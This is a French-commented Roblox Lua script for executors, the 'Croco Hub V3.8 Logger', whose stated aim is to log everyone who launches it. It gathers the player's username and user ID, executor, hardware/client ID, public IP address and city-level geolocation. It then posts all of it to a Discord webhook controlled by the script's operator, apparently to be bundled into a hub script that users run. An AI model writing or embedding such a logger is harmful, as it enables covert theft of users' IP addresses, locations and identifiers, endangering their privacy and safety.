-- 🐊 CROCO WEBHOOK SYSTEM - Logger Complet 🐊
-- Log toutes les infos des users qui lancent le script

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local MarketplaceService = game:GetService("MarketplaceService")

-- ========================================
-- ⚠️ REMPLACE PAR TON WEBHOOK DISCORD ! ⚠️
-- ========================================

local WEBHOOK_URL = "https://discord.com/api/webhooks/XXXXXXX/YYYYYYY"

-- ========================================
-- COLLECTE D'INFORMATIONS
-- ========================================

local player = Players.LocalPlayer

-- Executor
local function getExecutor()
    if identifyexecutor then
        return identifyexecutor()
    elseif KRNL_LOADED then
        return "KRNL"
    elseif syn then
        return "Synapse X"
    elseif SCRIPT_WARE_LOADED then
        return "Script-Ware"  
    elseif getexecutorname then
        return getexecutorname()
    else
        return "Unknown"
    end
end

-- HWID (équivalent MAC Address sur Roblox)
local function getHWID()
    if gethwid then
        return gethwid()
    elseif RbxAnalyticsService then
        local success, hwid = pcall(function()
            return RbxAnalyticsService:GetClientId()
        end)
        return success and hwid or "HWID_ERROR"
    else
        return "NOT_AVAILABLE"
    end
end

-- IP Address
local function getIP()
    local success, ip = pcall(function()
        return game:HttpGet("https://api.ipify.org", true)
    end)
    return success and ip or "IP_HIDDEN"
end

-- Localisation (via IP)
local function getLocation()
    local success, data = pcall(function()
        local response = game:HttpGet("http://ip-api.com/json/", true)
        return HttpService:JSONDecode(response)
    end)
    
    if success and data then
        return string.format("%s, %s (%s)", 
            data.city or "Unknown", 
            data.country or "Unknown",
            data.countryCode or "??"
        )
    else
        return "Location Hidden"
    end
end

-- Nom du jeu
local function getGameName()
    local success, info = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    return success and info.Name or "Unknown Game"
end

-- Discord (si disponible)
local function getDiscord()
    -- Chercher dans la description du profil
    local success, desc = pcall(function()
        return player:GetFriendsOnline()
    end)
    
    -- On ne peut pas vraiment get le Discord depuis Roblox
    -- Mais on peut essayer de le trouver dans les groups
    return "Not Available"
end

-- ========================================
-- COLLECTER TOUTES LES INFOS
-- ========================================

local UserData = {
    -- Roblox
    RobloxUsername = player.Name,
    RobloxDisplay = player.DisplayName,
    RobloxUserID = tostring(player.UserId),
    AccountAge = tostring(player.AccountAge) .. " jours",
    Premium = tostring(player.MembershipType == Enum.MembershipType.Premium),
    
    -- Jeu
    GameName = getGameName(),
    PlaceID = tostring(game.PlaceId),
    JobID = game.JobId,
    
    -- Système
    Executor = getExecutor(),
    HWID = getHWID(),
    MacAddress = getHWID(), -- Sur Roblox, HWID = équivalent MAC
    IPAddress = getIP(),
    Location = getLocation(),
    
    -- Discord
    Discord = getDiscord(),
    
    -- Temps
    Date = os.date("%d/%m/%Y"),
    Heure = os.date("%H:%M:%S"),
    Timestamp = os.time()
}

-- ========================================
-- ENVOYER AU WEBHOOK DISCORD
-- ========================================

local function sendToWebhook()
    local embed = {
        {
            ["title"] = "🐊 NOUVEAU USER CONNECTÉ !",
            ["description"] = "Un utilisateur vient de lancer le Croco Hub !",
            ["color"] = 2829617, -- Vert (#2BF941)
            ["fields"] = {
                {
                    ["name"] = "👤 **ROBLOX**",
                    ["value"] = string.format(
                        "```Username: %s\nDisplay: %s\nUserID: %s\nAge: %s\nPremium: %s```",
                        UserData.RobloxUsername,
                        UserData.RobloxDisplay,
                        UserData.RobloxUserID,
                        UserData.AccountAge,
                        UserData.Premium
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "🎮 **JEU**",
                    ["value"] = string.format(
                        "```Nom: %s\nPlaceID: %s\nJobID: %s```",
                        UserData.GameName,
                        UserData.PlaceID,
                        UserData.JobID
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "💻 **SYSTÈME**",
                    ["value"] = string.format(
                        "```Executor: %s\nHWID: %s\nMAC: %s```",
                        UserData.Executor,
                        UserData.HWID,
                        UserData.MacAddress
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "🌍 **LOCALISATION**",
                    ["value"] = string.format(
                        "```IP: %s\nLocation: %s```",
                        UserData.IPAddress,
                        UserData.Location
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "💬 **DISCORD**",
                    ["value"] = "```" .. UserData.Discord .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "⏰ **TIMESTAMP**",
                    ["value"] = string.format(
                        "```Date: %s\nHeure: %s```",
                        UserData.Date,
                        UserData.Heure
                    ),
                    ["inline"] = false
                }
            },
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
            },
            ["footer"] = {
                ["text"] = "🐊 Croco Hub V3.8 Logger",
                ["icon_url"] = "https://cdn.discordapp.com/emojis/1234567890.png"
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
        }
    }
    
    local payload = {
        ["username"] = "Croco Hub Logger 🐊",
        ["avatar_url"] = "https://cdn.discordapp.com/emojis/1234567890.png",
        ["embeds"] = embed,
        ["content"] = "@everyone **NOUVELLE CONNEXION !**"
    }
    
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    local success, response = pcall(function()
        return request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = headers,
            Body = HttpService:JSONEncode(payload)
        })
    end)
    
    if success and response.Success then
        print("✅ Webhook envoyé avec succès!")
        print("📊 Données envoyées à Discord!")
    else
        warn("❌ Erreur lors de l'envoi du webhook")
        warn(response)
    end
end

-- ========================================
-- AFFICHER LES INFOS DANS LA CONSOLE
-- ========================================

print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("🐊 CROCO HUB V3.8 - WEBHOOK LOGGER")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("")
print("📊 INFORMATIONS COLLECTÉES:")
print("")
print("👤 ROBLOX:")
print("  • Username:", UserData.RobloxUsername)
print("  • Display:", UserData.RobloxDisplay)
print("  • UserID:", UserData.RobloxUserID)
print("  • Account Age:", UserData.AccountAge)
print("  • Premium:", UserData.Premium)
print("")
print("🎮 JEU:")
print("  • Game:", UserData.GameName)
print("  • PlaceID:", UserData.PlaceID)
print("  • JobID:", UserData.JobID)
print("")
print("💻 SYSTÈME:")
print("  • Executor:", UserData.Executor)
print("  • HWID:", UserData.HWID)
print("  • MAC Address:", UserData.MacAddress)
print("")
print("🌍 LOCALISATION:")
print("  • IP:", UserData.IPAddress)
print("  • Location:", UserData.Location)
print("")
print("💬 DISCORD:")
print("  • Discord:", UserData.Discord)
print("")
print("⏰ TIMESTAMP:")
print("  • Date:", UserData.Date)
print("  • Heure:", UserData.Heure)
print("")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("📤 Envoi au webhook Discord...")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

-- Envoyer les données
task.spawn(function()
    task.wait(0.5)
    sendToWebhook()
end)

-- Retourner les données si besoin
return UserData
